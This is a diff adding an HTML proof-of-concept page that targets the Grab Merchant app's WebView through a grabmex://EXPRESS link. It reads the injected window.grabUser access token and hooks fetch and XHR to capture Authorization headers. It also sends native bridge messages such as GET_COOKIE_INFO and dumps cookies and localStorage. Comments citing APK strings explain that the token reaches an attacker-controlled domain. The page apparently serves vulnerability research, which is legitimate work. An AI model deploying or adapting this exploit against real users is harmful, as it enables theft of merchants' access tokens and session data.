@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>grabmex://EXPRESS — Access Token and Bridge Enumeration</title>
+</head>
+<body>
+    <pre id="output">Initializing...</pre>
+    <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
+    <script>eruda.init();</script>
+    <script>
+        var output = document.getElementById('output');
+        var lines = [];
+
+        function log(text) {
+            lines.push(text);
+            output.textContent = lines.join('\n');
+        }
+
+        function section(title) {
+            log('\n========================================');
+            log('  ' + title);
+            log('========================================\n');
+        }
+
+        function inspect(label, obj) {
+            if (typeof obj === 'undefined') {
+                log('[MISS] ' + label + ' is undefined');
+                return;
+            }
+            var type = obj === null ? 'null' : typeof obj;
+            log('[FOUND] ' + label + '  [' + type + ']');
+            if (type === 'string' || type === 'number' || type === 'boolean') {
+                log('  = ' + JSON.stringify(obj).substring(0, 500));
+            } else if (type === 'function') {
+                var src = String(obj);
+                log('  ' + (src.indexOf('[native code]') !== -1 ? '[NATIVE] ' : '[JS] ') + src.substring(0, 200));
+            } else if (type === 'object' && obj !== null) {
+                try {
+                    var keys = Object.getOwnPropertyNames(obj);
+                    log('  Properties (' + keys.length + '): ' + keys.join(', '));
+                    keys.slice(0, 25).forEach(function(k) {
+                        try {
+                            var v = obj[k];
+                            var t = v === null ? 'null' : typeof v;
+                            if (t === 'function') {
+                                var s = String(v);
+                                log('    .' + k + '()  ' + (s.indexOf('[native code]') !== -1 ? '[NATIVE]' : '[JS]'));
+                            } else if (t === 'object' && v !== null) {
+                                var subKeys = Object.getOwnPropertyNames(v);
+                                log('    .' + k + '  [object] keys=[' + subKeys.slice(0, 15).join(', ') + ']');
+                            } else {
+                                log('    .' + k + '  [' + t + '] = ' + JSON.stringify(v).substring(0, 200));
+                            }
+                        } catch(e) { log('    .' + k + '  [error] ' + e.message); }
+                    });
+                } catch(e) { log('  [error] ' + e.message); }
+            }
+        }
+
+        setTimeout(function() {
+            log('URL: ' + location.href);
+            log('User-Agent: ' + navigator.userAgent);
+            log('Timestamp: ' + new Date().toISOString());
+
+            /*
+             * Section 1: GrabExpress Access Token via Token Injection
+             *
+             * APK Evidence (libapp.so):
+             *   "      window.grabUser = "
+             *   "        function canInjectToken() {"
+             *   "          var __allowedTokenInjectionHosts__ = "
+             *   "/mex-app/troy/expressintegration/v1/account/access-token"
+             *
+             * The Grab Merchant app fetches a GrabExpress access token from
+             * the expressintegration API, then injects it into the WebView
+             * as window.grabUser via a token injection script that checks
+             * whether the loaded hostname matches the allowedTokenInjectionHosts
+             * list from remote configuration.
+             */
+            section('1. Token Injection — window.grabUser');
+            inspect('window.grabUser', window.grabUser);
+
+            /*
+             * Section 2: Authorization Header Capture
+             *
+             * APK Evidence (libapp.so):
+             *   "mexInAppWebViewUrlRequestHeader"     — shared header injector
+             *   "mex_inappwebview_url_request_header" — analytics tag
+             *   "has_authorization_header"            — flag for auth header presence
+             *   "grabid:access_token"                 — token key next to
+             *   ", useShouldInterceptFetchRequest: "  — fetch interceptor enabled
+             *
+             * The mexInAppWebViewHarness injects an Authorization header into
+             * HTTP requests made from the WebView. This intercepts both the
+             * initial page load request and subsequent fetch/XHR calls.
+             * If the loaded URL points to an attacker-controlled domain,
+             * the access token is transmitted to that domain.
+             */
+            section('2. Authorization Header Capture');
+
+            var capturedHeaders = [];
+            var originalFetch = window.fetch;
+            window.fetch = function() {
+                var url = arguments[0];
+                var init = arguments[1] || {};
+                log('[FETCH INTERCEPTED]');
+                log('  URL: ' + (typeof url === 'string' ? url : url.url));
+                if (init.headers) {
+                    var headers = init.headers;
+                    if (headers instanceof Headers) {
+                        headers.forEach(function(value, key) {
+                            log('  ' + key + ': ' + value.substring(0, 300));
+                            capturedHeaders.push(key + ': ' + value);
+                        });
+                    } else if (typeof headers === 'object') {
+                        Object.keys(headers).forEach(function(key) {
+                            log('  ' + key + ': ' + String(headers[key]).substring(0, 300));
+                            capturedHeaders.push(key + ': ' + headers[key]);
+                        });
+                    }
+                }
+                return originalFetch.apply(this, arguments);
+            };
+
+            var OrigXHR = window.XMLHttpRequest;
+            var origOpen = OrigXHR.prototype.open;
+            var origSetHeader = OrigXHR.prototype.setRequestHeader;
+            OrigXHR.prototype.open = function() { return origOpen.apply(this, arguments); };
+            OrigXHR.prototype.setRequestHeader = function(name, value) {
+                if (name.toLowerCase() === 'authorization' || name.toLowerCase() === 'x-auth-token') {
+                    log('[XHR HEADER CAPTURED]');
+                    log('  ' + name + ': ' + String(value).substring(0, 300));
+                    capturedHeaders.push(name + ': ' + value);
+                }
+                return origSetHeader.apply(this, arguments);
+            };
+
+            log('Fetch and XHR interceptors installed.');
+            log('Authorization headers will be logged when captured.');
+
+            try { fetch(location.href, { method: 'HEAD' }).catch(function(){}); } catch(e) {}
+            try { var x = new OrigXHR(); x.open('HEAD', location.href); x.send(); } catch(e) {}
+
+            /*
+             * Section 3: Flutter InAppWebView Bridge
+             *
+             * APK Evidence (libapp.so):
+             *   "com.pichillilorenzo/flutter_inappwebview"
+             *   "mexInAppWebViewControllerAdapterJsBridge"
+             *   "mexInAppWebViewHarness"
+             *
+             * The flutter_inappwebview plugin creates a window.flutter_inappwebview
+             * object with callHandler() and _callHandler() methods in every
+             * InAppWebView instance, including the ExpressWebViewScreenState.
+             * These methods allow JavaScript to invoke registered Dart handlers.
+             */
+            section('3. Flutter InAppWebView Bridge');
+            inspect('window.flutter_inappwebview', window.flutter_inappwebview);
+
+            /*
+             * Section 4: WebView Callback Bridge (postMessage)
+             *
+             * APK Evidence (libapp.so):
+             *   "webViewCallback"          — bridge object name
+             *   "onPostMessage"            — message handler
+             *   "onPostMessageMalformed"   — error handler
+             *   "MartSuppliesWebViewAction." — per-screen action enum
+             *
+             * NOTE: webViewCallback and its actions (DETECT_ADDRESS, etc.)
+             * are CONFIRMED only for MART_SUPPLIES via MartSuppliesWebViewAction.
+             * No ExpressWebViewAction enum exists in the APK. This section
+             * probes whether the shared webViewCallback is also available
+             * in the EXPRESS WebView context.
+             */
+            section('4. WebView Callback Bridge (postMessage)');
+            inspect('window.webViewCallback', window.webViewCallback);
+
+            if (window.webViewCallback) {
+                window.webViewCallback.onmessage = function(event) {
+                    log('[MESSAGE RECEIVED]');
+                    log('  ' + (typeof event.data === 'string' ? event.data : JSON.stringify(event.data)).substring(0, 500));
+                };
+
+                log('[SEND] DETECT_ADDRESS (confirmed for MART_SUPPLIES, probing for EXPRESS)');
+                try {
+                    window.webViewCallback.postMessage(JSON.stringify({ action: 'DETECT_ADDRESS', scope: 'MEX' }));
+                    log('  Sent successfully');
+                } catch(e) { log('  [ERROR] ' + e.message); }
+
+                log('[SEND] GET_COOKIE_INFO (generic native constant, 3 occurrences in DEX)');
+                try {
+                    window.webViewCallback.postMessage(JSON.stringify({ action: 'GET_COOKIE_INFO', scope: 'MEX' }));
+                    log('  Sent successfully');
+                } catch(e) { log('  [ERROR] ' + e.message); }
+            }
+
+            /*
+             * Section 5: Cookies and LocalStorage
+             *
+             * APK Evidence (libapp.so):
+             *   "enableMexWebViewGrabDomainCookieInjection"
+             *   "grab_com_cookie_injection_flag_error"
+             *
+             * Grab domain cookies may be injected into the WebView context
+             * when the loaded URL matches a Grab domain. This section captures
+             * any cookies and localStorage data accessible from this context.
+             */
+            section('5. Cookies');
+            if (document.cookie) {
+                document.cookie.split(';').forEach(function(c) { log('  ' + c.trim()); });
+            } else {
+                log('(no cookies accessible)');
+            }
+
+            section('6. LocalStorage');
+            try {
+                var storageKeys = Object.keys(localStorage);
+                log('Keys (' + storageKeys.length + '):');
+                storageKeys.forEach(function(k) {
+                    var val = localStorage.getItem(k);
+                    log('  ' + k + ' = ' + (val ? val.substring(0, 200) : '(empty)'));
+                });
+            } catch(e) { log('[error] ' + e.message); }
+
+            /*
+             * Section 7: Non-Default Window Properties (Bridge Sniper)
+             *
+             * Compares current window properties against a clean iframe baseline
+             * to identify all host-injected objects, functions, and values.
+             * Properties containing native code functions are flagged as bridges.
+             */
+            section('7. Non-Default Window Properties');
+            var baseline = new Set();
+            var frame = document.createElement('iframe');
+            frame.style.display = 'none';
+            document.documentElement.appendChild(frame);
+            try {
+                var w = frame.contentWindow;
+                for (var k in w) baseline.add(k);
+                Object.getOwnPropertyNames(w).forEach(function(k) { baseline.add(k); });
+            } catch(e) {}
+            try { document.documentElement.removeChild(frame); } catch(e) {}
+            if (baseline.size < 200) {
+                for (var k in window) {
+                    try {
+                        if (typeof window[k] === 'function' && String(window[k]).indexOf('[native code]') !== -1) baseline.add(k);
+                    } catch(e) { baseline.add(k); }
+                }
+            }
+
+            var selfInjected = ['eruda','output','lines','log','section','inspect',
+                'originalFetch','OrigXHR','origOpen','origSetHeader','capturedHeaders'];
+            selfInjected.forEach(function(k) { baseline.add(k); });
+
+            var injected = [];
+            for (var k in window) { if (!baseline.has(k)) injected.push(k); }
+            try {
+                Object.getOwnPropertyNames(window).forEach(function(k) {
+                    if (!baseline.has(k) && injected.indexOf(k) === -1) injected.push(k);
+                });
+            } catch(e) {}
+            injected.sort();
+
+            log('Baseline: ' + baseline.size + ' properties');
+            log('Injected: ' + injected.length + ' non-default properties\n');
+
+            injected.forEach(function(key) {
+                try {
+                    var val = window[key];
+                    var type = val === null ? 'null' : typeof val;
+                    var isBridge = false;
+                    if (type === 'function') isBridge = String(val).indexOf('[native code]') !== -1;
+                    if (type === 'object' && val !== null) {
+                        try {
+                            isBridge = Object.getOwnPropertyNames(val).some(function(sk) {
+                                try { return typeof val[sk] === 'function' && String(val[sk]).indexOf('[native code]') !== -1; }
+                                catch(e) { return false; }
+                            });
+                        } catch(e) {}
+                    }
+                    log((isBridge ? '[BRIDGE] ' : '         ') + 'window.' + key + '  [' + type + ']');
+                } catch(e) { log('         window.' + key + '  [error]'); }
+            });
+
+            section('Enumeration Complete');
+            log('Total injected properties: ' + injected.length);
+            var bridgeCount = injected.filter(function(k) {
+                try {
+                    var v = window[k]; var t = typeof v;
+                    if (t === 'function') return String(v).indexOf('[native code]') !== -1;
+                    if (t === 'object' && v !== null) {
+                        return Object.getOwnPropertyNames(v).some(function(sk) {
+                            try { return typeof v[sk] === 'function' && String(v[sk]).indexOf('[native code]') !== -1; }
+                            catch(e) { return false; }
+                        });
+                    }
+                } catch(e) {} return false;
+            }).length;
+            log('Native bridges detected: ' + bridgeCount);
+            log('Authorization headers captured: ' + capturedHeaders.length);
+
+        }, 800);
+    </script>
+</body>
+</html>
